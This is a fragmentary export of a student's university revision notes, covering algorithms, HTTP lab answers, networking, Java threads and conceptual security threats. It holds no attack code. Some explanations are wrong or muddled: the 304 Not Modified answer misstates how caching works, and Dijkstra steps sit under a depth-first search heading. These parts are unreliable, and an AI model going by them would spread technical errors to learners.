We write to **CurrentMax** and read **a** and **i** again.

It is a well-defined and unambiguous sequence of instructions designed to solve a problem in a finite amount of time.\n\n- **Big-T**, also known as Theta notation (Θ), is a mathematical notation used in computer science to describe the asymptotic behaviour or growth rate of an algorithm's time complexity. It represents the tight bound or upper and lower limits of the running time of an algorithm as the input size approaches infinity. In other words, Big-T provides a range of functions that bound the algorithm's performance.\n\n- **Big-O** notation (O) is another mathematical notation used in computer science to describe the upper bound or worst-case behaviour of an algorithm's time complexity. It provides a way to characterise the maximum amount of resources (usually time or space) that an algorithm requires to solve a problem. In other words, Big-O notation represents an algorithm's upper limit efficiency.\n\n- **Bubble sort** is a simple sorting algorithm that works by repeatedly swapping adjacent elements if they are in the wrong order. The algorithm gets its name from the way smaller elements \"bubble\" to the top of the list during each pass.\n\n- **Quick sort** is a divide-and-conquer algorithm that works by selecting a pivot element from the array and partitioning the other elements into two sub-arrays, according to whether they are less than or greater than the pivot. The sub-arrays are then recursively sorted.\n\n- **Radix sort** is a non-comparative sorting algorithm that sorts elements based on their digits or characters. It works by processing the digits or characters of the elements from the least significant digit to the most significant digit (or vice versa).\n\n- **NP-Complete** problems are a class of challenging computational problems that lack efficient polynomial-time algorithms. To solve them, approximation algorithms and heuristics are typically employed to find near-optimal solutions within reasonable time limits. One example of an NP-Complete problem is the Traveling Salesman Problem (TSP). The TSP asks for the shortest possible route that a salesman can take to visit a given set of cities exactly once and return to the starting city. The problem's difficulty lies in the exponential growth of possible routes as the number of cities increases.\n\n- **Primitive operators** are fundamental building blocks that perform elementary operations, such as arithmetic calculations, logical operations, or basic data manipulations. They are usually highly optimised and execute efficiently due to their direct implementation in the language or hardware.\n\n- **Data clustering** is a technique used in unsupervised machine learning to group similar data points together based on their characteristics or attributes. The goal is to identify patterns, similarities, or relationships within a dataset without prior knowledge of the classes or labels. **Bin Packing** problem is a combinatorial optimisation problem that deals with efficiently packing a set of items into a fixed number of bins or containers. The objective is to minimise the number of bins used while ensuring that the total size or weight of items does not exceed the bin's capacity. In summary, data clustering is a technique for grouping similar data points together based on their characteristics, while the Bin Packing problem is an optimisation problem concerned with packing items into bins to minimise the number of bins used.\n\n- **Evolutionary Programming** (EP) and **Genetic Algorithms** (GA) are both evolutionary computation techniques inspired by natural evolution, but they differ in their approach to problem-solving and the way they handle population dynamics. EP focuses on optimising individual solutions using real-valued representations, employs self-adaptation, and is suitable for continuous optimisation. On the other hand, GA focuses on evolving populations of solutions using binary representations, employs fixed population size, and can handle a wider range of problem types, including both discrete and continuous optimisation.\n\n- A **heuristic** is a technique or rule of thumb used to guide the search process towards more promising or favourable paths. Heuristics provide a practical way to make informed decisions based on available information and reduce the search space, thereby improving the efficiency of search algorithms.\n\n- The key difference between **P and NP** classes is that P represents problems that can be efficiently solved, while NP represents problems for which solutions can be efficiently verified but may not be efficiently found.\n\nSimilarities and Differences: **Random Mutation Hill Climbing** (RMHC), **Random Restart Hill Climbing**, and **Simulated Annealing** are all stochastic search algorithms used for optimisation problems. Here are the similarities and differences between these algorithms:\n\n**Similarities**:\n- They all belong to the general class of local search algorithms.\n- They iteratively explore the search space to find better solutions.\n- They can get trapped in local optima if not properly guided.\n\n**Differences**:\n- RMHC focuses on making random mutations to the current solution and accepts the new solution if it is better. It doesn't consider the direction of improvement or probability distributions.\n- Random Restart Hill Climbing periodically restarts the search from a random initial solution to escape local optima. It performs multiple independent runs and keeps the best solution found across all restarts.\n- Simulated Annealing uses a probabilistic approach to accept worse solutions in the early stages of the search. It gradually reduces the acceptance of worse solutions over time, mimicking the annealing process in metallurgy.\n\n- The \"**No Free Lunch**\" (NFL) theorem for heuristic search techniques is a fundamental result in the field of optimisation and machine learning. It states that, on average, no one heuristic search algorithm is universally better than all others across all possible problems.\n\n---\n5.5) The Ant Colony Optimization (ACO) algorithm is a metaheuristic approach inspired by the foraging behavior of ants. It is commonly used to solve combinatorial optimization problems such as the Traveling Salesman Problem (TSP).\n\n- Route Selection: In the ACO algorithm, artificial ants are used to explore the solution space. Each ant builds a solution by iteratively selecting the next city to visit based on certain criteria, such as the amount of pheromone deposited on the edges and the heuristic information. The ants probabilistically choose their next city, with higher probabilities given to cities with higher pheromone levels or shorter distances.\n\n- Pheromone Update: After each ant completes its tour, the pheromone levels on the edges are updated. The amount of pheromone deposited on an edge is typically proportional to the quality of the corresponding solution. Ants that find better solutions deposit more pheromone, while ants that find suboptimal solutions deposit less. This update of pheromone trails represents the collective learning of the ant colony and guides the search towards promising regions of the solution space.\n\n- Pheromone Evaporation: Pheromone trails have a tendency to evaporate over time in the ACO algorithm. This is done to avoid the convergence of the search to suboptimal solutions and promote exploration of new paths. Pheromone evaporation ensures that the influence of outdated or less desirable solutions diminishes over iterations, allowing the ants to focus on better paths.\n\nThe combination of route selection, pheromone update, and pheromone evaporation in ACO contributes to an iterative process where the ants explore the search space, deposit pheromone based on the quality of solutions, and gradually converge towards better solutions. The positive feedback mechanism of pheromone reinforcement and the exploration-exploitation balance achieved through pheromone evaporation allow the algorithm to effectively search for high-quality solutions in complex optimization problems like the TSP.\n\n5.6) Swarm Intelligence (SI) is a field that studies the collective behavior of natural and artificial systems composed of many individuals. Two properties of swarm intelligence are:\n\n- Emergence: Swarm intelligence exhibits emergent behavior, which means that complex global patterns or behavior arise from the interactions and local behaviors of individual entities within the swarm. The collective behavior of the swarm is not explicitly designed or controlled by a central authority but emerges from the interactions and local rules followed by the individuals. In the case of ACO, emergent behavior is observed as the colony of artificial ants collectively finds good solutions to the TSP.\n\n- Self-Organization: Swarm intelligence systems exhibit self-organization, which refers to the ability of individuals within the swarm to organize themselves without external coordination or central control. Each individual in the swarm follows simple rules and interacts with its neighbors or environment, leading to self-organized patterns or solutions that adapt to changing conditions. In ACO, the ants self-organize their exploration and exploitation of the solution space through the use of pheromone trails and local heuristics, resulting in the emergence of effective solutions to the TSP.","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/exam2023","university/cs2004"]},"/notes/university/year2/cs2004/data-structures":{"title":"CS2004 - Data Structures","content":"# CS2004 - Data Structures\nData structures are the foundation stone of all algorithms.\n\nWe can measure how good a particular data structure is by using [big-O notation](notes/university/year2/cs2004/big-o-notation.md).\n\n- [Lists](notes/general/lists.md)\n- [Graphs](notes/university/year2/cs2004/graphs.md)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/depth-first-search":{"title":"Depth-First Search","content":"# Depth-First Search\nIt allows us to explore nodes and edges of a [graph](notes/university/year2/cs2004/graphs.md).\n\nThe traversal will go as far as possible down a path until a **dead end** is reached.\n\nIn an [undirected](notes/university/year2/cs2004/graphs.md#Undirected|undirected) graph:\n- A node is a dead end if all of the nodes adjacent to it have already been visited.\n\nIn an [directed](notes/university/year2/cs2004/graphs.md#Directed|directed) graph:\n- A node is a dead end if it has no outgoing edges and we visited everything else.\n\n### Undirected Graph\n![400](notes/images/Screenshot%202022-11-07%20at%2009.58.41.png)\n\n![400](notes/images/Screenshot%202022-11-07%20at%2009.58.55.png)\n\n![400](notes/images/Screenshot%202022-11-07%20at%2010.00.55.png)\n\n### Directed Graphs\n![400](notes/images/Screenshot%202022-11-07%20at%2010.01.48.png)\n\n## Steps\n1.

Array of distances from the source node (A) to each node in the graph. The weight of the source node is instantiated as 0 while all the other nodes initial value is infinity.\n2. Array of all nodes in the graph, which will be empty by the end (unvisited array).\n3. Array of all the nodes that the algorithm has visited, which by the end will contain all the nodes of the graph (visited array).\n\n### Example\n---\nStarting from the source (A), we visit its neighbour with the lowest weight (B).\n\nWe then check:\n```c\nif (D[current_node]) + D[adjacent_edge] \u003c D[adjacent])\n```\n\nIf **true**, we update the adjacent distance with the new shortest path.\n\nUsing A as a starting point, from A to B: D = 0 + 2 which is \u003c D[B] = infinity. Therefore, we update.\n\nAs you can see on the graph, when in current node A (starting node), the cost of going to its neighbours, B and C, is of 2 and 4 respectively. Because 2 and 4 are less than B and C current values (infinity), we update the table.\n\nNote that the letter next to the number indicates what path is was taken:\n| Current Node | A   | B   | C   | D   | E   | F   |\n| ------------ | --- | --- | --- | --- | --- | --- |\n| A            | 0A  | 2A  | 4A  |     |     |     |\n\nNow with **B** being the current node, we repeat. For example, to get C there is a cost of 1. We sum B's current distance from the source with the distance to C and check if it is less than the current value (infinity).\n| Current Node | A   | B   | C   | D   | E   | F   |\n| ------------ | --- | --- | --- | --- | --- | --- |\n| A            | 0A  | 2A  | 4A  |     |     |     |\n| B            | 0A  | 2A  | 3B  | 6B  | 4B  |     |\n\nNow moving on to **C**, it has only one unchecked neighbour, E.

For example, 1000 in our 1000 Primes Scales example.\n\nDetermining $T_0$ can be a problem:\n- Too small and the algorithm will behave like a hill climber.\n- Too large and the algorithm may never converge.\n\nThe acceptance function PR is defined as follows:\n\n$PR(f' ,f, T_i)$ = $exp{- \\Delta f \\over T_i}$\n\nwhere $\\Delta f$ = $|f' - f|$\n\nNote that $|x|$ means the absolute value of $x$, and equals $-x$ if $x \u003c 0$ or $x$ if $x \\geq 0$.\n\n- Loss (or change) is how much worse a neighbouring state is compared to the current state.\n- If $|f' - f|$ is close to zero PR will be 1, therefore we'll accept the new solution.\n- If $|f' - f|$ is large, the new solution is worse than our old solution.\n    - If $T$ is small, it is very unlikely we'll accept the new solution (PR - will be very small).\n    - If $T$ is large, it is likely that we'll accept the solution even the new solution is worse.\n\n### Results Summary\n---\nThe methods performed as follows:\n- RMHC: 9.0\n- SHC: 8.0\n- RRHC: 6.2\n- SA: **5.8**\n\nHowever, these results were only from 10 runs for 1000 iteration.\n\nThey should have been run for maybe 100 repeats of perhaps 10000 iterations?\n\nMaybe real numbers instead of prime numbers?\n\n# About HC and SA\n---\nAll of HC and the SA algorithms search for a good solution by starting at a random point and then examining neighbouring points.\n\nThis type of search is known as a **local** or **neighbourhood** search methods.\n","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/intro-gen-algorithms":{"title":"Introduction to Genetic Algorithms","content":"---\nGenetic Algorithms belong to a family of techniques that are inspired from evolution theory.\n\n- Each **gene** is a binary digit.\n- A **chromosome** is a string of genes.\n\nA **solution** to a problem is encoded as a chromosome.

R|$\n\nThe **fitness function** will take two parameters:\n- A **potential solution** - binary string of length $n$.\n- A **set of weights** - a real vector/array of length $n$.\n\nIt will then return a real number.\n\nEach weight $w_i$ will either be added onto the left hand side L or the right hand side R.\n\nSo we can iterate through each weight adding it to L or R depending on what side of the scales the representation specifies the weight is on.\n\n![|500](notes/images/Screenshot%202022-12-16%20at%2012.14.34.png)\n\n### Example\n---\nSo imagine we have five weights:\n- $W = {1, 2, 3, 4, 10}$.\n- $w_1 = 1, w_2 = 2, w_3 = 3, w_4 = 4, w_5 = 10$.\n\nSome example fitness (F):\n- $S = 11111$\n    - $L = 0, R = 1 + 2 + 3 + 4 + 10 = 20, F = |0 - 20| = 20$\n- $S = 10101$\n    - $L = 2 + 4, R = 1 + 3 + 10, F = |6 - 14| = 8$\n\n- $S = 01010$\n    - $L = 1 + 3 + 10 = 14, R = 2 +  4 = 6, F = |14 - 6| = 8$\n- $S = 11110$\n    - $L = 10, R = 1 + 2 + 3 + 4 = 10, F = |10 - 10| = 0$\n\n## What's next?\n---\nWe have a representation.\n\nWe have a fitness function.\n\nWe now want to search through a number of possible $S$ until we find the best one.\n- For example, when $F(S, W) = 0$.\n- Or as close to zero as possible.\n\nWe therefore need to apply an appropriate heuristic search method:\n- Random Mutation Hill Climbing, Stochastic Hill Climbing, Random Restart Hill Climbing, Simulated Annealing, Genetic Algorithms, Particle Swarm Optimisation, Tabu-Search, Iterated Local Search, Evolutionary Programming, etc...","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/selection-sort":{"title":"Selection Sort","content":"# Selection Sort\n---\nIt sorts an array by repeatedly finding the minimum element from the unsorted part of the array and puts it at the beginning.\n\n![Screenshot 2022-10-24 at 16.59.08](notes/images/Screenshot%202022-10-24%20at%2016.59.08.png)","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2004"]},"/notes/university/year2/cs2004/sets-and-maps":{"title":"Sets and Maps","content":"**Sets** are a collection of objects:\n  -

How many HTTP GET requests are sent by the client to the server?  \n\n2\n\n2. What objects the client (browser) requests from the server?  \n\n`/` and `favicon.ico`\n\n3. The status code returned from the server to the client for each GET request.\n\n200 OK and 404 Not Found.\n\n---\n1. Inspect the contents of the first HTTP GET request from your browser to the server. Do you see an “IF-MODIFIED-SINCE” line in the HTTP GET?  \n\nNo.\n\n2. Inspect the contents of the server response. Did the server explicitly return the contents of the file? How can you tell?  \n\nIt did as I can see the header in the \"Line-Based Text Data\" section as it is displayed in the browser.\n\n3. Now inspect the contents of the second HTTP GET request from your browser to the server. Do you see an “IF-MODIFIED-SINCE:” line in the HTTP GET? If so, what information follows the “IF-MODIFIED-SINCE:” header?  \n\nNot on the next request but on the 5th one where we get the source (`/`). The information that follows is: Sun, 03 Sep 2017 09:41:30 GMT.\n\n4. What is the HTTP status code and phrase returned from the server in response to this second HTTP GET? Did the server explicitly return the contents of the file?\n\nStatus is 304 Not Modified. It did not return the content of the files because the browser couldn't retrieve it from the cache. If the file was modified when it was last accessed, then it would have returned the contents. However, it simply tried to retrieve the old file from its cached memory.\n\n---\n\n1. How many HTTP GET request messages did your browser send? Which packet number in the trace contains the GET message?  \n\n2 GET requests (one for favicon). Packet number 6 and 105.\n\n2. Which packet number in the trace contains the status code and phrase associated with the response to the HTTP GET request?  \n\n103.\n\n3. What are the status code and phrase in the response?  \n\nCode was 200 and message was OK.\n\n4. How many data-containing TCP segments were needed to carry the single HTTP response and the text? (It may be helpful to change the filter to `ip.addr==10.0.2.254` to see the full sequence of packets.)\n\n49 reassembled TCP segments.\n\n---\n1. How many HTTP GET request messages did your browser send?  \n\n3.\n\n2. Do all requests download objects from the same URI?\n\nYes they all come from the same server. However, `brunel-logo.png` is being referred from `images.html`.\n\n---\n1. What is the server’s response (status code and phrase) in response to the initial HTTP GET message from your browser?  \n\n\n\n2. When your browser sends the HTTP GET message for the second time, what new field is included in the HTTP GET message?\n\nAuthorization.\n\n# CS2005 Lab 4 - Distributed Systems\n---\nUbuntu1: 10.0.2.4/24\nUbuntu2: 10.0.3.4/24","lastmodified":"2023-09-12T17:33:55.173934459Z","tags":["university/cs2005","university/cs2005/lab"]},"/notes/university/year2/cs2005/2022-11-13":{"title":"2022 11 13","content":"|     | O5Client                                                                         |     | O5Server                                                                      |\n| --- | -------------------------------------------------------------------------------- | --- | ----------------------------------------------------------------------------- |\n|     |                                                                                  |     | (run O5Server)                                                                |\n|     | (run O5Client)                                                                   |     |                                                                               |\n|     |                                                                                  |     | SEND \"O5Server is ready\"                                                      |\n|     | RECEIVE \"O5Server is ready\"                                                      |     |                                                                               |\n|     |                                                                                  |     | (accept O5Client connection)                                                  |\n|     | WHILE NOT TERMINATED                                                             |     | WHILE NOT TERMINATED                                                          |\n|     |                                                                                  |     | SEND \"Welcome to O5AppShop [...] Choose and option: 1.

Each flag represents the intention of a process to enter the critical section, and `turn` indicates whose turn it is to enter.\\n\\n2. Entry Protocol: Before a process enters the critical section, it sets its flag to indicate its intention to enter and assigns the turn to the other process.

Which two of the OSI model’s layers are NOT included in the TCP/IP stack?  \n2. The Internet Standards are described in formal documents. What are these documents called?  \n3. What is the interface between a process and the network?  \n4. Complete the phrase: “The Transport layer provides logical communication between ...“  \n5.

The two layers of the OSI model that are not included in the TCP/IP stack are:\n    - Presentation Layer (Layer 6): This layer is responsible for data representation and translation, such as encryption and decryption. The TCP/IP stack does not have a separate layer for these functions.\n    - Session Layer (Layer 5): This layer establishes, manages, and terminates connections between applications. In the TCP/IP stack, these functions are typically handled by the Transport Layer (Layer 4).\n    \n2. The Internet Standards are described in formal documents called Request for Comments (RFCs). RFCs are documents that define protocols, procedures, and standards for the Internet.\n\n3. The interface between a process and the network is typically provided by the Socket API (Application Programming Interface). The Socket API allows processes to create network sockets, which are endpoints for sending and receiving data over the network. Through the socket interface, processes can establish network connections, send and receive data, and manage network communication.\n\n4. Complete the phrase: \"The Transport layer provides logical communication between processes or applications on different hosts.\"\n\n5. A \"link state\" routing algorithm is typically decentralised. In a link state routing algorithm, each router collects information about the state of its directly connected links and shares this information with other routers in the network. Each router then independently calculates the best path to reach a destination based on the collected link state information. This decentralised approach allows routers to make routing decisions autonomously.\n\n6. Memory that can be dynamically allocated to a process during runtime is called heap memory or dynamic memory. Heap memory is used for storing data structures and objects that are created and destroyed dynamically at runtime using functions like malloc() and free().\n\n7. Yes, a thread does share its code section with other threads belonging to the same process. Threads within a process share the same code section, also known as the text section or code segment, of the process. Each thread has its own stack and data section, but they all execute the same code.\n\n8. A process can change shared variables in the section of its code where the shared variables are accessed or modified. Typically, this is done within a critical section or a mutually exclusive region where proper synchronization mechanisms, such as locks or semaphores, are used to ensure that only one thread or process can access the shared variables at a time, preventing data inconsistencies or race conditions.\n\n9. Yes, a Trojan Horse is an example of a program threat. A Trojan Horse is a type of malicious software or code that disguises itself as a legitimate program or file, tricking users into executing it. Once executed, it can perform various malicious activities, such as stealing data or providing unauthorised access to the attacker. Program threats generally refer to vulnerabilities or weaknesses in software programs that can be exploited to compromise their security, such as buffer overflows or code injection attacks.\n\n## Question 2\n---\n- Short essay.\n\n- Topics:\n    - Application layer (incl. Distributed Systems)  \n    - Transport layer  \n    - Network layer\n\n### Example questions:\n- Answer the questions below. Use examples to illustrate your answers:\n1. Discuss how two processes communicate over a network. Include in your answer the role of Sockets, Ports, IP Addresses and what is required from Transport Services available to Applications.  \n\n2. Define Multiplexing and Demultiplexing in the Transport Layer. Discuss how Transport Layer segments are sent and received in connectionless and connection-oriented protocols.\n\n### Answers:\n**Discuss how two processes communicate over a network. Include in your answer the role of Sockets, Ports, IP Addresses and what is required from Transport Services available to Applications.**\n\nTwo processes communicate over a network by utilising various network protocols and components. One of the key components involved in the communication process is sockets. Sockets act as endpoints for communication, allowing processes to send and receive data over the network. Each socket is identified by a unique combination of IP address and port number. The IP address identifies the host or device on the network, while the port number identifies the specific process or application running on that host.\n\nFor example, consider two processes, Process A and Process B, running on different hosts. Process A wants to send data to Process B over the network. Firstly, Process B creates a socket and binds it to a specific port number on its host. This allows Process B to listen for incoming connections. Process A then creates a socket and specifies the IP address of Process B's host and the corresponding port number to establish a connection.\n\nIP addresses play a crucial role in the communication process as they uniquely identify each host on the network. They are used to route the data packets from the source host to the destination host.\n\nTransport services, such as those provided by the Transport Layer protocols (e.g., TCP and UDP), are required to facilitate reliable and efficient communication between the two processes. The Transport Layer segments the data received from the application layer into smaller units called segments. These segments are then encapsulated with header information, including source and destination port numbers, sequence numbers, and other control information.\n\n**Define Multiplexing and Demultiplexing in the Transport Layer. Discuss how Transport Layer segments are sent and received in connectionless and connection-oriented protocols.**\n\nMultiplexing and demultiplexing are essential functions of the Transport Layer.\n\n- Multiplexing refers to the process of combining multiple data streams into a single stream for transmission over a network. It allows multiple processes or applications running on the same host to share the network resources. Multiplexing is achieved by assigning different source port numbers to each data stream.\n\n- Demultiplexing is the process of separating the received data stream back into individual streams and delivering them to the respective processes or applications. It is done by examining the destination port number in the received Transport Layer segment and forwarding the data to the appropriate socket.\n\nIn connectionless protocols, such as UDP (User Datagram Protocol), Transport Layer segments are sent independently without establishing a dedicated connection between the sender and receiver. Each segment is routed individually, and the receiving process can handle them in any order. However, UDP does not provide reliable delivery or congestion control.\n\nIn connection-oriented protocols, such as TCP (Transmission Control Protocol), a reliable and ordered connection is established between the sender and receiver before data transmission. Transport Layer segments are sent over this established connection, ensuring reliable delivery, flow control, and congestion control. The segments are received, reassembled in the correct order, and delivered to the receiving process.\n\n### Networks revision topics\n- Internet components \u0026 services (hosts, protocols, RFCs, IETF, ...)  \n- Protocol layers (OSI, TCP/IP)  \n- Main principles of network applications (client-server, P2P, message exchange, IP addresses, sockets, port numbers, data integrity, throughput, ...)  \n- Web services (HTTP, messages, request, response, headers, ...)\n- Electronic mail over the Internet (user agent, mail server, SMTP, POP3, IMAP, HTTP, ...)  \n- How processes communicate (messages, sockets, port numbers, IP addresses, ...)  \n- Transport services (mux/demux, reliable data transfer, flow control, congestion control, ...)  \n- TCP, UDP\n- Segment structure (port #, seq, ack numbers, receive window, ...)  \n- Forwarding/routing  \n- Routing algorithms  \n- Router components  \n- IPv4 \u0026 IPv6 datagram  \n- IPv4 addressing  \n- Fragmentation / reassembly\n\n## Question 3\n---\n- Short essay.\n\n- Topics:\n    - Operating Systems Structures  \n    - Processes  \n    - Threads  \n    - Synchronisation\n\n### Example questions:\n- Answer the questions below.

What is their purpose, and how are they different from application programs? Discuss FIVE categories of system programs.**\n\nSystem programs are a collection of software programs that provide essential services and functionality to the operating system and users. They are designed to manage and control various aspects of the computer system. Unlike application programs, which are developed to fulfil specific user tasks, system programs are responsible for managing the resources and supporting the execution of application programs.\n\nThe purpose of system programs is to enhance the overall efficiency, performance, and usability of the computer system. They provide an interface between the user and the hardware, enabling users to interact with the system and perform various tasks. System programs also facilitate the management of system resources, such as memory, files, and devices.\n\nHere are five categories of system programs:\n\n1. **Operating System (OS):** The operating system is the core system program that manages and controls the overall operation of the computer system. It provides services such as process management, memory management, file management, device management, and user interface. Examples of operating systems include Windows, macOS, Linux, and Android.\n\n2. **Device Drivers:** Device drivers are system programs that facilitate communication between the operating system and hardware devices. They provide the necessary instructions and interfaces for the operating system to interact with specific hardware components such as printers, keyboards, mice, and network adapters. Device drivers ensure that the hardware devices work seamlessly with the rest of the system.\n\n3. **Utilities:** Utilities are system programs that perform specific tasks related to system management and maintenance. They provide tools for tasks such as disk management, file system analysis, data backup, system optimisation, and virus scanning. Examples of utilities include disk defragmenters, antivirus software, file compression tools, and system monitoring tools.\n\n4. **Compilers and Interpreters:** Compilers and interpreters are system programs that translate high-level programming languages into machine code that can be executed by the computer. Compilers convert the entire program into machine code, while interpreters translate and execute the program line by line. They are essential for executing application programs written in languages such as C, Java, Python, and JavaScript.\n\n5. **System Libraries:** System libraries are collections of pre-compiled code and functions that provide reusable routines and functionality to application programs. They include libraries for graphics, networking, input/output operations, and mathematical computations. System libraries simplify the development process by providing ready-made code that can be used by application programmers.\n\nIn summary, system programs are critical components of the operating system that provide essential services and functionality. They differ from application programs in that they manage and control system resources and provide services to application programs and users.\n\n**What are the main states of a Java Thread? Discuss the lifecycle of a Java Thread and how it shares runtime with other Threads.**\n\nIn Java, a thread represents an independent unit of execution within a program. Threads allow concurrent execution of tasks, enabling multiple operations to occur simultaneously. A Java thread can be in one of the following main states:\n\n1. **New:** When a thread is created but has not yet started, it is in the \"New\" state. In this state, the thread is allocated system resources, but it has not begun its execution.\n\n2. **Runnable:** A thread enters the \"Runnable\" state when it is eligible to run, but it may or may not be currently executing. In this state, the thread can be executing its task or waiting for its turn to be scheduled by the operating system.\n\n3. **Blocked:** A thread in the \"Blocked\" state is waiting for a certain condition to be satisfied before it can resume execution. For example, a thread may be blocked if it is waiting for a lock or for input/output operations to complete.\n\n4. **Waiting:** A thread enters the \"Waiting\" state when it waits for a specific condition to occur. Unlike the \"Blocked\" state, a waiting thread is not waiting for a lock or input/output operation but for another thread to explicitly notify it to resume execution.\n\n5. **Terminated:** A thread reaches the \"Terminated\" state when it completes its execution or when an exception terminates it.\n\nThe lifecycle of a Java thread consists of several stages:\n\n1. **Creation:** In this stage, a thread is created using the `new` keyword or by extending the `Thread` class or implementing the `Runnable` interface. The thread is in the \"New\" state.\n\n2. **Runnable:** Once the thread is created, it can be started using the `start()` method. The thread moves to the \"Runnable\" state and is eligible for execution. The thread scheduler then determines when to execute the thread.\n\n3. **Running:** When the thread scheduler selects the thread for execution, it enters the \"Running\" state. The thread's `run()` method is executed, and it performs its designated tasks.\n\n4. **Blocked/Waiting:** While running, a thread might encounter situations that cause it to enter the \"Blocked\" or \"Waiting\" state. For example, if a thread tries to acquire a lock that is held by another thread, it becomes blocked. If a thread calls the `wait()` method, it goes into the \"Waiting\" state.\n\n5. **Termination:** A thread completes its execution or is terminated if an exception occurs. Once the thread finishes its task or encounters an exception, it enters the \"Terminated\" state and cannot be restarted.\n\nThreads share runtime with other threads through a mechanism called thread scheduling. The operating system's thread scheduler assigns a time slice or execution time to each thread. Threads take turns executing their tasks, allowing concurrent execution. The scheduling algorithm determines the order and duration of execution for each thread.\n\nThreads can interact and share resources through shared variables or objects. However, proper synchronization mechanisms, such as locks or synchronised blocks, should be used to ensure thread safety and avoid data races or inconsistencies when multiple threads access shared resources simultaneously.\n\nIn summary, the lifecycle of a Java thread includes creation, runnable, running, blocked/waiting, and termination stages. Threads share runtime by being scheduled by the operating system's thread scheduler. They can interact and share resources, but care must be taken to ensure thread safety using synchronization mechanisms.\n\n### Operating Systems revision topics  \n- Operating systems services  \n- Operating systems interfaces (users, programs)  \n- System calls  \n- System programs  \n- What is a process (structure, PCB, ...)?  \n- Process states and lifecycle  \n- Process scheduling (schedulers, queues, ...)  \n- Concurrency / parallelism  \n- What is a thread?  \n- Threads states and lifecycle (in Java)  \n- Critical section problem  \n- Critical section problem solution requirements  \n- Bounded buffer (producer-consumer) problem  \n- Race condition  \n- Mutex locks, semaphores, monitors  \n- Deadlock / starvation\n\n## Question 4\n---\n- Short essay.\n\n- Topics:\n    - Security problem (threats and attacks)  \n    - Encryption \n\n### Example questions\n1. Discuss THREE types of Program Threats. Give an example for each one.  \n\n2. What are accidental or malicious security violations. Discuss FOUR types and THREE levels at which security measures could be taken.\n\n### Answers:\n\n**1. Discuss THREE types of Program Threats. Give an example for each one.**\n\na) **Viruses**: Viruses are malicious programs that attach themselves to legitimate files or programs and replicate when the infected file or program is executed. They can cause damage to the system, steal sensitive information, or disrupt normal operations. For example, the \"Melissa\" virus spread through email attachments and infected documents, leading to widespread disruption in 1999.\n\nb) **Malware**: Malware, short for malicious software, refers to a broad category of software threats designed to harm or exploit computer systems. This includes various types such as worms, trojans, ransomware, and spyware. An example of malware is the \"WannaCry\" ransomware, which encrypted files on infected systems and demanded a ransom for their release.\n\nc) **Logic Bombs**: Logic bombs are code snippets or programs that lie dormant within a system until triggered by a specific event or condition. Once triggered, they execute malicious actions, such as deleting files or causing system failures. An example is the \"Michelangelo\" virus, which lay dormant and activated on March 6, Michelangelo's birthday, when it would destroy data on infected systems.\n\n**2. What are accidental or malicious security violations? Discuss FOUR types and THREE levels at which security measures could be taken.**\n\nAccidental or malicious security violations refer to actions that compromise the security of a system either unintentionally or intentionally. Here are four types of security violations:\n\na) **Unauthorised Access**: Unauthorised access occurs when an individual gains entry to a system or resource without proper authorisation. This could be due to weak passwords, misconfiguration, or exploiting vulnerabilities. For example, an attacker guessing a user's password to gain access to their online banking account.\n\nb) **Data Breach**: A data breach is the unauthorised access, acquisition, or exposure of sensitive data. It can result from hacking, social engineering, or insider threats. An example is when a hacker infiltrates a company's database and steals customer information like credit card details or personal records.\n\nc) **Denial of Service (DoS) Attacks**: DoS attacks aim to disrupt or prevent legitimate users from accessing a system or service. Attackers overload the target system with a flood of requests, exhausting its resources and causing it to become unresponsive. An example is a Distributed Denial of Service (DDoS) attack, where multiple compromised computers flood a target server with traffic, making it unavailable to legitimate users.\n\nd) **Information Theft**: Information theft involves stealing sensitive data for malicious purposes, such as identity theft or financial fraud. It can happen through methods like phishing, key-logging, or exploiting software vulnerabilities. For instance, an attacker intercepting credit card details during an online transaction.\n\nSecurity measures can be implemented at various levels:\n\n1. **Physical Level**: Security measures at the physical level focus on securing the physical infrastructure of the system or network. This includes measures like access controls, surveillance cameras, and secure data centres.\n\n2. **Network Level**: Network-level security measures protect the communication and data transmission within a network. This includes implementing firewalls, intrusion detection systems, and encryption protocols to secure network traffic.\n\n3. **Host Level**: Security measures at the host level focus on securing individual computer systems or servers. This involves employing antivirus software, implementing strong authentication mechanisms, and keeping the software and operating systems up to date.\n\nIn conclusion, accidental or malicious security violations encompass various threats and actions that compromise the security of computer systems. Examples include unauthorised access, data breaches, DoS attacks, and information theft. Security measures can be implemented at the physical, network, and host levels to mitigate these risks.\n\n### Security revision topics  \n- Security violations  \n- Security measures  \n- Program threats and examples  \n- System and network threats and examples  \n- Cryptography terms  \n- Encryption  \n- Encryption algorithms essential property  \n- Symmetric encryption and example algorithms  \n- Asymmetric encryption and example algorithms\n\n---\n## Textbook References:\n### Computer Networks  \n- Chapter 1 Computer Networks and the Internet  \n- [x] 1.1 What Is the Internet? ✅ 2023-05-11\n- [x] 1.1.1 A Nuts-and-Bolts Description ✅ 2023-05-11\n- [x] 1.1.2 A Services Description ✅ 2023-05-11\n- [x] 1.1.3 What Is a Protocol? ✅ 2023-05-11\n- [x] 1.5 Protocol Layers and Their Service Models ✅ 2023-05-11\n- Chapter 2 Application Layer  \n- [x] 2.1 Principles of Network Applications ✅ 2023-05-11\n- [x] 2.2 The Web and HTTP ✅ 2023-05-11\n- [x] 2.3 Electronic Mail in the Internet ✅ 2023-05-11\n- [x] 2.7 Socket Programming: Creating Network Applications ✅ 2023-05-11\n- Chapter 3 Transport Layer  \n- [x] 3.1 Introduction and Transport-Layer Services ✅ 2023-05-11\n- [x] 3.2 Multiplexing and Demultiplexing ✅ 2023-05-11\n- [x] 3.3 Connectionless Transport: UDP ✅ 2023-05-11\n- [x] 3.5 Connection-Oriented Transport: TCP ✅ 2023-05-11\n- [x] 3.7 TCP Congestion Control ✅ 2023-05-11\n- Chapter 4 The Network Layer: Data Plane  \n- [x] 4.1.1 Forwarding and Routing: The Data and Control Planes ✅ 2023-05-11\n- [x] 4.2 What’s Inside a Router?
